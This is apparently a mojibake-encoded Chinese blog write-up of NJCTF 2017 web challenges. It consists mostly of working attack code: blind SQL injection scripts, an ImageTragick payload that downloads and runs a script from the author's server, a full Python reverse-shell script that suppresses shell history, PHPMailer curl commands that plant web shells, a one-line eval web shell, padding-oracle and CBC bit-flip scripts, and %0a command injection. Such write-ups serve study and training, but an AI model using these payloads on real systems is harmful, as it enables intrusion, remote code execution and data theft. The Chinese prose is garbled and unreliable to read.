---
title: NJCTF Webé¢˜è§£
subtitle: CTF
time: 2017.03.17 10:00:00
layout: post
catalog: true
tags:
- CTF
- Web

excerpt: ä¸Šå‘¨æœ«å’ŒRedbudçš„é˜Ÿå‹ä¸€èµ·åˆ·äº†NJCTFçš„é¢˜ç›®ã€‚NJCTFçš„Webé¢˜æœ‰12é¢˜ï¼Œéå¸¸å¤šã€‚å›¢é˜Ÿçš„ä¸€éƒ¨åˆ†äººåˆè·‘å»å‡ºé¢˜äº†ï¼Œå‘¨å­¦é•¿ä¹Ÿå› ä¸ºé¡¹ç›®çš„é—®é¢˜æ²¡æ¥æ‰“æ¯”èµ›ã€‚æœ€åï¼Œå°±æˆ‘å’Œä¸€ä¸ªå­¦å¼Ÿæ‰“äº†è¿™æ¬¡çš„Webé¢˜ç›®ï¼Œæ‰“å¾—æ¯”è¾ƒè‰°è¾›ã€‚

---



# NJCTF Web

ä¸€å…±åšå‡ºäº†7é¢˜

![NJCTF](http://momomoxiaoxi.com/img/post/NJCTF/NJCTF.png)



### Login

æ³¨å†Œçš„æ—¶å€™ï¼Œç”¨æˆ·åå¯ä»¥ç”¨ç©ºæ ¼æˆªæ–­æ³¨å†Œä¸€ä¸ªadmin [å¾ˆå¤šç©ºæ ¼]12345	ï¼Œå¯†ç aasdewdwqffç„¶åï¼Œç™»é™†admin ï¼Œå¯†ç aasdewdwqff å°±èƒ½æ‹¿åˆ°adminæƒé™ï¼Œè¿™é‡Œæ˜¯ç»•è¿‡varcharçš„é™åˆ¶

å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š[http://www.freebuf.com/articles/web/124537.html ](http://www.freebuf.com/articles/web/124537.html)æ³¨ï¼šå¿…é¡»æ˜¯sql_modeä¸ºå®½æ¾æ¨¡å¼æ—¶

### Come on

è¿™é¢˜æ¯”èµ›æœŸé—´æ²¡åšå‡ºæ¥ã€‚

èƒ½åšåˆ°çš„ä¿¡æ¯æ˜¯ å®½å­—èŠ‚æ³¨å…¥ã€‚

%df%27 è¿”å›Could not get data.

ç„¶åï¼Œè¿‡æ»¤äº†å¾ˆå¤šå¾ˆå¤šæ•æ„Ÿå­—ï¼ˆ/*ã€*/ã€andã€orã€midã€substrã€unionã€>ã€<ã€ç©ºç™½ç¬¦ã€asciiï¼‰ï¼Œä¸€ç›´æ²¡æ‰¾åˆ°èƒ½è¿è¡Œçš„payloadè¿›è¡Œæ”»å‡»ã€‚

æ¯”èµ›å®Œï¼Œé—®äº†åˆ«äººï¼Œæ‰æƒ³åˆ°å…¶å®å¯ä»¥ä½¿ç”¨binaryç±»å‹è½¬æ¢ï¼Œè¿›è¡Œæ”»å‡»

é¦–å…ˆï¼Œç”¨`||`æ›¿æ¢or,å†åˆ©ç”¨right leftå®šä½ï¼Œç©ºæ ¼å¯ä»¥ç”¨%0b å°±æ˜¯ï¼ˆï¼‰

```http
http://218.2.197.235:23733/index.php?key=-1%df%27||left((select(flag)from(flag)),1)=0x4e%23
```

è¿™é‡Œï¼Œæœ‰å‡ ä¸ªæ³¨æ„çš„ç‚¹ï¼š

1. å•å¼•å·è¢«è½¬ç§»ï¼Œéœ€è¦ç”¨16è¿›åˆ¶
2. mysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å¯¹äº16è¿›åˆ¶ï¼Œè¦ä¹ˆäºŒé‡16è¿›åˆ¶ï¼Œè¦ä¹ˆä½¿ç”¨binaryå‡½æ•°

äºŒé‡16è¿›åˆ¶ï¼š

```http
GET /index.php?key=-1%df%27||left((select(hex(flag))from(flag)),2)=0x34Â§34Â§%23=>>45
```

binaryå‡½æ•°ï¼š

 ```http
GET /index.php?key=-1%df%27||left((select(flag)from(flag)),1)=binary(0xÂ§34Â§)%23
 ```



likeå‡½æ•°



```http
/index.php?key=-1%df%27||(select(binary(flag))from(flag))like(0xÂ§4eÂ§25)%23
```

é€‰æ‹©ç”¨like ç»•è¿‡ã€‚å•å¼•å·è¢«è½¬ä¹‰äº†ç”¨16è¿›åˆ¶ç»•è¿‡ï¼Œä½†æ˜¯æœ‰å‡ ä¸ªå‘ï¼šmysqlé»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œåœ¨selectçš„æ—¶å€™åŠ ä¸Šbinaryï¼›_åœ¨likeè¯­å¥ä¸­éœ€è¦è½¬ä¹‰ã€‚

è¿˜ä¸€ç§åˆ©ç”¨likeçš„payload:

```Sql
select * from foo where code like '%%fd'||1.having(select(1)from(select(flag)from(flag)where(flag)like(binary(0x4e4a4354467b354830575f4d335f53304d335f735131695f547249436b357d25)))x)#%'
```

å†™äº†å‡ ä¸ªpayloadï¼š

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

url = "http://218.2.197.235:23733/index.php?key="
payload = "-1%df%27||left((select(hex(flag))from(flag)),{pos})=0x{c}%23"
req = requests.Session()
str = string.printable
char =''
flag = ''
end =0
for i in xrange(1,81):
    for s in str:
        char = (flag+s).encode('hex')
        endurl = (url+payload).format(pos = i,c = char)
       # print endurl
        r = req.get(endurl)
        #print r.text
        if len(r.text)>1000:
            flag +=s
            print flag
            break
        if s ==str[-1]:#æœç´¢ä¸€åœˆéƒ½æ²¡æœåˆ°
            print "we get all!"
            end =1
            break
    if(end):
        break

print flag.decode('hex')

```

```python
#!usr/bin/env python
#-*- coding:utf-8 -*-
import requests

url = "http://218.2.197.235:23733/index.php?key="
payload = "-1%df%27||left((select(hex(flag))from(flag)),{pos})=0x{c}%23"
req = requests.session()
flag =''
for i in xrange(1,100):
    for h in xrange(0x00,0xff+1):
        endurl = (url+payload).format(pos = i,c =flag+hex(h)[2:])
        #print endurl
        r = req.get(endurl)
        if len(r.text)>1000:
            flag +=hex(h)[2:]
            print flag
            break

print flag.decode('hex').decode('hex')

```

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import string
url = 'http://218.2.197.235:23733/index.php?key='
payload ='%df%27||right(left((select(flag)from(flag)),{pos}),1)=binary(0x{c})%23'
req =requests.session()

def get_flag():
    flag = ""
    str = string.printable
    for i in xrange(1,50):
        for char in str:
            endurl = (url+payload).format(pos=i,c=char.encode('hex'))
            r = req.get(endurl)
            #print endurl
            if(char=='}'):
                flag+=char
                print "we get all flag!"
                print flag
                print 'test'
                exit()
            if(len(r.text)>1000):
                flag+=char
                print flag
                break
get_flag()

```

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import string
import requests

req = requests.session()
url = "http://218.2.197.235:23733/index.php?key="
payload = "-1%df%27||(select(binary(flag))from(flag))like(0x{}25)%23"
str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

def get_flag():
    flag=''
    for i in xrange(1,99):
        for c in str:
            char = (flag+c).encode('hex')
            endurl = (url+payload).format(char)
            #print endurl
            r = req.get(endurl)
            if(len(r.text)>1000):
                flag +=c
                print flag
                break
get_flag()

```



### Be Logical

è¿™é“é¢˜åº”è¯¥æ˜¯è¿™æ¬¡æ¯”èµ›å‡ºçš„æœ€å¥½çš„ä¸€é¢˜ï¼Œå¾ˆæœ‰æ„æ€ã€‚å¯æƒœæ¯”èµ›çš„æ—¶å€™ï¼Œæ²¡å’‹åšå®ƒã€‚

ä¸»è¦è¿‡ç¨‹å°±æ˜¯ï¼šé€»è¾‘æ¼æ´->ImageMagick->PHPMailer

ç¬¬ä¸€æ­¥å­˜åœ¨ä¸¤ä¸ªå¯èµ°çš„ç‚¹ï¼š

1. æ˜¯åå°åœ¨refundçš„æ“ä½œä¸­ï¼Œç”¨äº†intvalå‡½æ•°ï¼Œæ¯”è¾ƒpointä¸monyæ˜¯å¦ç›¸ç­‰ï¼Œæ¥ç¡®è®¤æ•°æ®æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ã€‚intval(1e3)=intval(1)ã€‚è¿™æ ·å°±èƒ½è´­ä¹°æœåŠ¡äº†ã€‚
2. æœ¬é¢˜ä¹Ÿå¯ä»¥è·å–.Sign.php.swpæ–‡ä»¶ï¼Œèƒ½å¤Ÿå‘ç°ç­¾åç®—æ³•å­˜åœ¨ç¼ºé™·ï¼Œå¯ä»¥çˆ†ç ´secret_keyé•¿åº¦å¹¶ä½¿ç”¨å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ä¼ªé€ ç­¾åæ¥è¿›è¡Œåˆ·é’±

æ¥ä¸‹æ¥å°±è¿›å…¥åˆ°ç¬¬äºŒæ­¥ï¼Œè¿™é‡Œæœ‰`convert` å›¾ç‰‡çš„åŠŸèƒ½ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šå…¶å­˜åœ¨ä¸€ä¸ªImageMagickçš„æ¼æ´

è¿™é‡Œå‚è€ƒä¸¤ç¯‡åšå®¢ï¼š

[http://www.s0nnet.com/archives/imagetragick](http://www.s0nnet.com/archives/imagetragick)

[https://www.waitalone.cn/imagemagick-poc.html](https://www.waitalone.cn/imagemagick-poc.html)

å†™ä¸€ä¸ªimage.png

```http
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|wget http://106.14.61.185/files/imageMagic.py -O /tmp/imageMagic.py && python /tmp/imageMagic.py 106.14.61.185 12315")'
pop graphic-context
```

ç„¶åï¼ŒæŠŠè„šæœ¬éƒ¨ç½²åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Š

http://106.14.61.185/files/imageMagic.py

```python
# -*- coding:utf-8 -*-
#!/usr/bin/env python
"""
back connect py version,only linux have pty module
code by google security team
"""
import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % name

def main():
    if len(sys.argv) !=3:
        usage(sys.argv[0])
        sys.exit()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((sys.argv[1],int(sys.argv[2])))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if __name__ == '__main__':
    main()
```

æœåŠ¡å™¨ç›‘å¬ä¸€ä¸‹ nc -l - 12315

ä¸Šä¼ pngæ–‡ä»¶ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨convertï¼Œç„¶åå°±èƒ½åå¼¹shell

![shell1](http://momomoxiaoxi.com/img/post/NJCTF/shell1.png)

 ç¿»ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°flagã€‚è‡ªç„¶æ¥ä¸‹æ¥å°±åº”è¯¥æ˜¯å†…ç½‘æ¸—é€äº†ã€‚

è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œä½¿ç”¨arp -nvå¯ä»¥å¿«é€Ÿæ¢æµ‹å†…ç½‘(å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨curlæ¥è·å¾—è¿œç¨‹çš„ä¸€ä¸ªpyæ‰«æè„šæœ¬ï¼Œç„¶åæ‰«æ)

```
arp -nv
arp -nv
Address                  HWtype  HWaddress           Flags Mask            Iface
172.17.42.1              ether   72:1d:76:57:41:32   C                     eth0
172.26.0.20              ether   72:1d:76:57:41:32   C                     eth0
172.17.0.1               ether   02:42:ac:11:00:01   C                     eth0
172.17.0.19              ether   02:42:ac:11:00:13   C                     eth0
Entries: 4	Skipped: 0	Found: 4
```

éƒ½æµ‹è¯•ä¸€ä¸‹ã€‚

å¯ä»¥çœ‹åˆ°åœ¨172.17.0.19å­˜æ´»ä¸€ä¸ªMail SYSTEM

![mailsystem](http://momomoxiaoxi.com/img/post/NJCTF/mailsystem.png)

æœä¸€æ³¢ï¼Œå­¦ä¹ ä¸€ä¸‹

[https://blog.chaitin.cn/phpmailer-cve-2016-10033/](https://www.waitalone.cn/imagemagick-poc.html)

è¿™é‡Œçš„æ ¹ç›®å½•æ²¡åŠæ³•å†™ï¼Œå­˜åœ¨uploadsç›®å½•ï¼Œä½†æ˜¯uploadsç›®å½•ä¸‹ä¸€å¥è¯æ²¡åŠæ³•æ‰§è¡Œ(è²Œä¼¼æ˜¯å› ä¸º;çš„åŸå› ï¼Œå¯ä»¥ä¼ å…¥`<?php system($_GET[test]);?>` è¿™ç§æ ¼å¼å»ç»•è¿‡ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨system

```Sh
curl http://172.17.0.19 -d "subject=<?php system('ls ./');?>&email=aaa( -X /var/www/html/uploads/xiaoxi1.php )@qq.com&message=<?php echo moxiaoxi;?>&submit=Send email"
curl http://172.17.0.19/uploads/xiaoxi1.php
curl http://172.17.0.19 -d "subject=<?php system('ls ../');?>&email=aaa( -X /var/www/html/uploads/xiaoxi2.php )@qq.com&message=<?php echo moxiaoxi;?>&submit=Send email"
curl http://172.17.0.19/uploads/xiaoxi2.php
curl http://172.17.0.19 -d "subject=<?php system('cat ../flaaaaaaag.php');?>&email=aaa( -X /var/www/html/uploads/xiaoxi3.php )@qq.com&message=<?php echo moxiaoxi;?>&submit=Send email"
curl http://172.17.0.19/uploads/xiaoxi3.php
```

å¾—åˆ°flag

![belogical](http://momomoxiaoxi.com/img/post/NJCTF/belogical.png)

### Guess

è¿™ç§urlå¾ˆå®¹æ˜“å°±èƒ½æƒ³åˆ°å¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«æˆ–è€…ä¼ªåè®®è¯»å–

http://218.2.197.235:23735/index.php?page=php://filter/read=convert.base64-encode/resource=upload

è¯»æºç 

```php

<?php
error_reporting(0);
function show_error_message($message)
{
    die("<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function show_message($message)
{
    echo("<div class=\"msg success\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function random_str($length = "32")
{
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';

    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

    return $str;
}

session_start();



$reg='/gif|jpg|jpeg|png/';
if (isset($_POST['submit'])) {

    $seed = rand(0,999999999);
    mt_srand($seed);
    $ss = mt_rand();
    $hash = md5(session_id() . $ss);
    setcookie('SESSI0N', $hash, time() + 3600);

    if ($_FILES["file"]["error"] > 0) {
        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
    }
    $check1 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/png"))
        && ($_FILES["file-upload-field"]["size"] < 204800));
    $check2=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));


    if ($check2) show_error_message("Nope!");
    if ($check1) {
        $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
        if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
        } else show_error_message("Something wrong with the upload...");
    } else {
        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
    }
}
?>
```

è„¸é»‘ï¼Œæ¯”èµ›çš„æ—¶å€™è„šæœ¬æ²¡è·‘å®ŒğŸ˜¢

è¿™é¢˜çš„æ€è·¯ï¼Œå’Œä»¥å‰åšçš„ä¸€ä¸ªé¢˜æ€è·¯å¾ˆåƒã€‚

å…ˆä¼ªåè®®è¯»æºç ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªphpå‹ç¼©åŒ…ï¼ˆæ”¹åä¸ºpngï¼‰ï¼Œå†ä¼ªåè®®ï¼ˆzipæˆ–pharï¼‰è¯»å–é©¬ï¼Œå¾—åˆ°shellã€‚è¿™æ¬¡çš„ä¸»è¦é—®é¢˜åœ¨äºï¼Œé¢˜ç›®æŠŠè·¯å¾„åŠ äº†ä¸€ä¸ªå‰ç¼€ï¼Œéœ€è¦çˆ†ç ´éšæœºæ•°ç§å­æ‰èƒ½åˆ©ç”¨ã€‚

çˆ†ç ´éšæœºæ•°ç§å­(session_idä¸ºæˆ‘ä»¬çš„ PHPSESSIDï¼Œhashä¸ºSESSI0N)

è®°å¾—åœ¨æ–‡ä»¶å¤´è®¾ç½®ä¸€ä¸‹è¿è¡Œæ—¶é—´æ— é™ini_set('max_execution_time', '0');

```php
for($i=0;$i<=999999999;$i++){
    $seed =$i;
    mt_srand($seed);
    $ss = mt_rand();
    $session_id="kfm3fk6doepaefpaa9al32h8j7";
    $hash1 = md5($session_id. $ss);
    $hash2 = "72a6022fd34bf1980ea8d20aafa3bd2a";
    if($hash1===$hash2){
        echo "we get seed:".$i;
        break;
    }
    if($i==999999999){
        echo "run down!we can't get it!";
        break;
    }
}
echo './uP1O4Ds/' . random_str() . '_';
```

è¿è¡Œç»“æœï¼š

![getseed](http://momomoxiaoxi.com/img/post/NJCTF/getseed.png)

http://218.2.197.235:23735//index.php?page=zip://uP1O4Ds/hz3CZpGyYKnjH51V6fVYvCmpGXrIzeWm_test.png%23test

å†è¯·æ±‚ä¸€ä¸‹å³å¯

![getshell](http://momomoxiaoxi.com/img/post/NJCTF/getshell.png)

è¿æ¥ä¸€ä¸‹ï¼Œçœ‹ä¸€æ³¢

![upload](http://momomoxiaoxi.com/img/post/NJCTF/upload.png)

è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œå¯ä»¥è¿…é€Ÿçˆ†ç ´mt_seed:[http://www.openwall.com/php_mt_seed/](http://www.openwall.com/php_mt_seed/)

### Wallet

æ‰«ä¸€æ³¢ç›®å½•ï¼Œèƒ½å¾—åˆ°ä¸€ä¸ªwww.zipçš„æ–‡ä»¶ã€‚

ï¼ˆå¼±å¯†ç æ°¸è¿œè·‘ä¸å‡ºæ¥orzã€‚ã€‚ã€‚åæ¥ï¼Œåˆ«äººç»™äº†ä¸ªå¼±å¯†ç njctf2017ï¼‰

ç„¶åï¼Œä»£ç æœ‰æ··æ·†ï¼Œéšä¾¿æ‰¾ä¸ªç½‘ç«™è§£å¼€æ··æ·†



```Php
<?php
 require_once("db.php"); 
 $auth = 0; 
 if (isset($_COOKIE["auth"])) { 
 	$auth = $_COOKIE["auth"]; 
 	$hsh = $_COOKIE["hsh"]; 
 	if ($auth == $hsh) { 
 		$auth=0; 
 		}else if (sha1((string)$hsh) == md5((string)$auth)) { 
 			$auth = 1; 
 		}else{ 
 			$auth=0; 
 		} 
 	}else { 
			$auth = 0; 
			$s = $auth; 
			setcookie("auth", $s); 
			setcookie("hsh", sha1((string)$s)); 
			} 
 	if ($auth) { 
 		if (isset($_GET['query'])) { 
 			$db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY); 
 			$qstr = SQLITE3::escapeString($_GET['query']); 
 			$query = "SELECT amount FROM my_wallets WHERE id=$qstr"; -1 union select flag from flag %23
 			$result = $db->querySingle($query); 
 			if ( !$result === NULL){ 
 				echo "Error - invalid query"; 
 			} else { 
 				echo "Wallet contains: $result"; 
 			} 
 			} else { 
 				echo "<html><head><title>Admin Page</title></head><body>Welcome to the admin panel!<br /><br /><form name='input' action='admin.php' method='get'>Wallet ID: <input type='text' name='query'><input type='submit' value='Submit Query'></form></body></html>"; 
 			} 
 	} else echo "Sorry, not authorized."; ?>
```

ä¸€å¼€å§‹å°±æ˜¯å¾ˆå…¸å‹çš„å¼±ç±»å‹ç»•è¿‡ï¼Œsha1==md5

å¼±ç±»å‹

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
var_dump('0010e2' == '1e3');
var_dump('0x1234Ab' == '1193131');
var_dump('0xABCdef' == ' 0xABCdef');
var_dump(0 == 'abcdefg');
var_dump(1 == '1abcdef');
?>
```

md5 ï¼š240610708ï¼ŒQNKCDZOï¼Œaabg7XSsï¼ŒaabC9RqS

Sha1:aaroZmOk ï¼ŒaaK1STfYï¼ŒaaO8zKZFï¼Œaa3OFF9m



åé¢ï¼Œå°±æ˜¯queryå¤„å­˜åœ¨æ³¨å…¥ï¼ˆè¿™é‡Œçš„éš¾ç‚¹åœ¨äºåªèƒ½çŸ¥é“æœ‰flagè¡¨ã€‚ã€‚è¦çŒœidï¼‰

æœ€åçš„payload

```http
GET /admin.php?query=-11+and+1=2+union+select+id+from+flag+--+ HTTP/1.1
Host: 218.2.197.235:23723
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: piclist=a%3A6%3A%7Bi%3A0%3Bs%3A44%3A%22upload%2Ff7363981c96e54e1f2d8a66aa5cca157.jpeg%22%3Bi%3A1%3Bs%3A44%3A%22upload%2F620eb40635025e52a20ffdffa20298fc.jpeg%22%3Bi%3A2%3Bs%3A44%3A%22upload%2F77af6d66ab71143e5adf91a4dafe3719.jpeg%22%3Bi%3A3%3Bs%3A42%3A%22upload%2F2bc5ef7c4ded2aae2987bfb71a7a700f.js%22%3Bi%3A4%3Bs%3A46%3A%22upload%2F3608dcbf9c8c241b3b8e757353c34f3c.p%2500hp%22%3Bi%3A5%3Bs%3A46%3A%22upload%2Ff954062fc88b8a7524c79d95ae2a7b4c.php%2500%22%3B%7D; auth=QNKCDZO; hsh=aaroZmOk
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```





### Be admin

å­˜åœ¨index.php.bak

åé¢æœ‰æ—¶é—´å†æ¥å¤ç°

ä¸»è¦è€ƒç‚¹ï¼šæºç å®¡è®¡ CBCæ¯”ç‰¹åè½¬ Padding-Oracle 

å¯ä»¥ç®—æ˜¯æ¯”è¾ƒç»¼åˆçš„Webå¯†ç å­¦é¢˜äº†

å…·ä½“æ€è·¯ï¼š

å­˜åœ¨bakæºç æ³„éœ²ä»¥æä¾›ç™½ç›’ï¼Œä½¿ç”¨sqliæ§åˆ¶æŸ¥è¯¢è¯­å¥çš„è¿”å›å€¼ï¼Œä»è€Œå¯ä»¥æ§åˆ¶è¢«ä¼ é€’è¿›loginå‡½æ•°çš„å‚æ•°ï¼Œç”±äºphp==è¿ç®—ç¬¦çš„å®‰å…¨é—®é¢˜ï¼Œç™»é™†éªŒè¯å‡½æ•°å¯ä»¥è¢«ä½œä¸ºOracleæ¥ä½¿ç”¨ï¼Œä»è€Œå¯ä»¥ç¼–å†™è„šæœ¬ï¼Œåœ¨æ²¡æœ‰å¯†é’¥çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡padding oracleè§£å‡ºæ˜æ–‡ï¼Œå†é€šè¿‡å¼‚æˆ–æ„é€ ivï¼Œä»è€Œåœ¨å¯†æ–‡ä¸å˜çš„æƒ…å†µä¸‹ä½¿è§£å¯†åçš„ç»“æœå˜ä¸ºadminï¼Œè¿›è€Œè·å–flag



index.php.bakæºç æ³„æ¼ï¼Œçœ‹æºç çŸ¥é“å¯è¿›è¡ŒCBCçš„Padding Oracleå’Œå­—èŠ‚ç¿»è½¬æ”»å‡»ã€‚

>  ä¸‹é¢çš„è„šæœ¬æ˜¯ç›´æ¥è´´çš„åˆ«äººçš„

è¿›è¡ŒPadding Oracleæ”»å‡»çš„è„šæœ¬ï¼š

```python
python

import requests

import base64



url = 'http://218.2.197.235:23737/index.php'

N = 16

l = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]

token = ''

out = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]



for i in range(1,17):

    for c in range(0,256):

        print c

        l[N-i] = c

        token = ''

        for m in l:

            token = token + chr(m)

        token = base64.b64encode(token)

        header = {'Cookie':"PHPSESSID=oot8oracn7o49ibrriscjikal4;ID=yudfxWJ2ptjjo8NLxaLeZQ%3D%3D;token="+token}

        res = requests.get(url, headers=header)

        data = res.content

        print data

        if 'ERROR' not in data:

            out[N-i] = c ^ i

            for y in range(i):

                l[N-y-1] = out[N-y-1] ^ (i+1)

            break

    print out
```

 å¯ä»¥å°†defaultIdçš„æ˜æ–‡è¯»å–å‡ºæ¥ä¸ºOrDinaryU5eRï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œå­—èŠ‚ç¿»è½¬æ”»å‡»ä½¿å¾—è§£å¯†ä¸ºadminå°±å¯ä»¥æ‹¿åˆ°flagã€‚è¿›è¡Œå­—èŠ‚ç¿»è½¬æ”»å‡»çš„è„šæœ¬ï¼š

```python
php

<?php

    $c = base64_decode("ndncqTzQYbXSIiXc4Gc0OA==");

    $s = "OrDinaryU5eR";

    $tmp = $c;

    $tmp[0] = chr(ord($s[0]) ^ ord($tmp[0]) ^ ord('a'));

    $tmp[1] = chr(ord($s[1]) ^ ord($tmp[1]) ^ ord('d'));

    $tmp[2] = chr(ord($s[2]) ^ ord($tmp[2]) ^ ord('m'));

    $tmp[3] = chr(ord($s[3]) ^ ord($tmp[3]) ^ ord('i'));

    $tmp[4] = chr(ord($s[4]) ^ ord($tmp[4]) ^ ord('n'));

    $tmp[5] = chr(ord($s[5]) ^ ord($tmp[5]) ^ 11);

    $tmp[6] = chr(ord($s[6]) ^ ord($tmp[6]) ^ 11);

    $tmp[7] = chr(ord($s[7]) ^ ord($tmp[7]) ^ 11);

    $tmp[8] = chr(ord($s[8]) ^ ord($tmp[8]) ^ 11);

    $tmp[9] = chr(ord($s[9]) ^ ord($tmp[9]) ^ 11);

    $tmp[10] = chr(ord($s[10]) ^ ord($tmp[10]) ^ 11);

    $tmp[11] = chr(ord($s[11]) ^ ord($tmp[11]) ^ 11);

    $tmp[12] = chr(4 ^ ord($tmp[12]) ^ 11);

    $tmp[13] = chr(4 ^ ord($tmp[13]) ^ 11);

    $tmp[14] = chr(4 ^ ord($tmp[14]) ^ 11);

    $tmp[15] = chr(4 ^ ord($tmp[15]) ^ 11);

    print base64_encode($tmp);

?>
```

 å°†å¾—åˆ°çš„IVæ”¾åˆ°cookieä¸­çš„tokenï¼Œè®¿é—®å¾—åˆ°flagã€‚

### Get Flag

å¾ˆå…¸å‹çš„ä¸€ä¸ªå‘½ä»¤æˆªæ–­(&ä¹Ÿå¯ä»¥)

%0aæˆªæ–­ å¯¼è‡´å‘½ä»¤æ‰§è¡Œ

`flag=%0a+ls+../../&submit=`

è§£ç base64ï¼Œä¼šæœ‰ä¸€ä¸ª

```cat: images/: Is a directory 9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag```

è¯»å–ä¸€ä¸‹

flag=%0a+cat+../../9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag&submit=

å¾—åˆ°flag

### pictures' wall

å¾ˆå¥‡æ€ªçš„é¢˜ç›®- -

ç™»å½•æ¡†æ— è®ºè¾“å…¥å•¥éƒ½èƒ½ç™»é™†ï¼Œç³»ç»Ÿæç¤ºéœ€è¦ç®¡ç†å‘˜æƒé™..æ€€ç–‘ä¸æ˜¯ç”¨æˆ·åå¯†ç éªŒè¯ï¼Œå°è¯•httpæ–¹é¢çš„ç»•è¿‡

è„‘æ´ä¸€æ³¢ã€‚ã€‚host:127.0.0.1 ç»•è¿‡ç™»é™†ï¼Œå¾—åˆ°rootæƒé™

rootæœ‰ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡ç•Œé¢ã€‚ã€‚è¿·ä¹‹ç»•è¿‡ï¼ˆfuzzä¸€æ³¢ï¼Œå¯ä»¥çœ‹åˆ°phtmlå¯ä»¥ä¸Šå»ã€‚ç„¶åé¢˜ç›®è²Œä¼¼è¿‡æ»¤äº†?)

```Php
<script language="php"> @eval($_POST[xiaoxi])</script>

```

ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæ”¹åç¼€phtml

ä¸è¿‡ï¼Œè¿™ä¸ªé¢˜ç›®ç¡®å®éå¸¸å¥‡æ€ªã€‚ã€‚

çœ‹äº†ä¸‹æºç ï¼š

```php
<?php
        $content=file_get_contents($_FILES["pic"]["tmp_name"]);
        if($filearr === "phtml"){
            if(preg_match("/.*<\?php.*/",$content)){
                die("Something shows it is a php file!");
            }
            if (!preg_match("/.*<script language=('|\")php('|\")>.*/",$content)) {
                die("Do you  want to  upload a php file?!");
            }
        }

 
```

æ„Ÿè§‰æ­£å¸¸å¼€å‘ç¯å¢ƒä¸­ä¸ä¼šå‡ºç°ğŸ˜‚

### Text wall

